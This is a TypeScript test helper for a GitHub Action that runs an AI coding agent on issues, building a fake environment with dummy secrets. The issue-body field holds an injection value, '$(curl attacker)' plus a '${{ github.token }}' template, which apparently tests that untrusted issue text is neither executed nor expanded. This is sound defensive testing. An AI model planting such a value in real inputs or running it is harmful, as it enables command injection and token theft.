import * as path from 'node:path';
import { prependPath, runGit } from './github-action-test-helpers';

export const ACTION_ROOT = path.resolve(import.meta.dir, '..', '..', '..');
export const ACTION_REF = runGit(ACTION_ROOT, 'rev-parse', 'HEAD');

export function binary(binDir: string, name: string): string {
	return path.join(binDir, process.platform === 'win32' ? `${name}.cmd` : name);
}

export function stageTranscript(sessionID = 'session-2498'): string {
	return JSON.stringify({
		sessionID,
		issueTrace: '2498-publish-gated-action',
		stages: [
			'issue-ingestion',
			'specification',
			'planning',
			'gated-implementation',
			'independent-review',
			'tests',
			'swarm-ci',
		],
		part: { type: 'text', text: 'trace evidence' },
	});
}

export function environment(
	root: string,
	binDir: string,
	baseSha: string,
	output: string,
	argsLog: string,
	envLog: string,
	agentOutput: string,
	opencodeBinary = binary(binDir, 'fake-opencode'),
	opencodeScript = '',
) {
	return {
		GITHUB_WORKSPACE: root,
		GITHUB_REPOSITORY: 'owner/repository',
		GITHUB_OUTPUT: output,
		SWARM_ACTION_MODE: 'prepare',
		SWARM_ACTION_REPOSITORY: 'owner/repository',
		SWARM_ACTION_ISSUE_NUMBER: '2498',
		SWARM_ACTION_ISSUE_TITLE: 'Issue title',
		SWARM_ACTION_ISSUE_BODY: '$(curl attacker)\n${{ github.token }}',
		SWARM_ACTION_DELIVERY_ID: 'delivery-2498',
		SWARM_ACTION_LABEL: 'swarm-auto',
		SWARM_ACTION_LABELER: 'trusted-maintainer',
		SWARM_ACTION_BASE_SHA: baseSha,
		SWARM_ACTION_BASE_BRANCH: 'main',
		SWARM_ACTION_ISSUE_URL: 'https://github.com/owner/repository/issues/2498',
		SWARM_ACTION_DEADLINE_MS: '120000',
		SWARM_ACTION_MAX_ATTEMPTS: '1',
		SWARM_ACTION_TEST_HARNESS: '1',
		SWARM_ACTION_OPENCODE_VERSION: '1.18.26',
		SWARM_ACTION_BUN_VERSION: '1.3.14',
		SWARM_ACTION_PLUGIN_REF: ACTION_REF,
		GITHUB_ACTION_PATH: ACTION_ROOT,
		GITHUB_ACTION_REF: ACTION_REF,
		SWARM_ACTION_SESSION_ID: 'session-2498',
		SWARM_ACTION_ISSUE_TRACE: '2498-publish-gated-action',
		SWARM_ACTION_PROVIDER_SECRET: 'PROVIDER_SECRET_2498',
		SWARM_ACTION_PUBLICATION_TOKEN: 'WRITE_TOKEN_MUST_NOT_REACH_PREPARE',
		GH_TOKEN: 'GH_TOKEN_MUST_NOT_REACH_PREPARE',
		GITHUB_TOKEN: 'GITHUB_TOKEN_MUST_NOT_REACH_PREPARE',
		SWARM_ACTION_OPENCODE_BIN: opencodeBinary,
		SWARM_ACTION_BUN_BIN: binary(binDir, 'fake-bun'),
		SWARM_ACTION_ARTIFACT_PATH: '.swarm/github-action/artifact.json',
		FAKE_ARGS_LOG: argsLog,
		FAKE_ENV_LOG: envLog,
		FAKE_AGENT_OUTPUT: agentOutput,
		FAKE_OPENCODE_VERSION: '1.18.26',
		FAKE_BUN_VERSION: '1.3.14',
		FAKE_NODE: process.execPath,
		FAKE_SCRIPT: opencodeScript,
		FAKE_ISSUE_URL: 'https://github.com/owner/repository/issues/2498',
		PATH: prependPath(binDir),
	};
}
